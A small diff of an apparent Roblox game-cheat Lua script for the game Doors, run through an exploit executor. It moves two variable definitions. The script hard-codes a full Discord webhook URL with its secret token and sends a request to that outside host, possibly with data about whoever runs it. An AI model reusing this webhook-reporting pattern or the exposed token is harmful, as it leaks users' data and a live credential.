@@ -4,6 +4,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local RbxAnalyticService = game:GetService("RbxAnalyticsService")
 
+local Player = Players.LocalPlayer
+local Character = Player.Character
+
 local Webhook = "https://discord.com/api/webhooks/1071650724267700234/wQdzJnulo4XUHG4_wRLnoFvguj8OJKatuAh7SmkdGx6pjV30JTFWKNPT4ZYAbnGMo7h_"
 
 local request = syn.request(
@@ -51,9 +54,6 @@ local request = syn.request(
 
     }
 )
-
-local Player = Players.LocalPlayer
-local Character = Player.Character
 
 local EntitiesList = {"RushMoving", "AmbushMoving", "A60", "A120"}
 local Entities = {
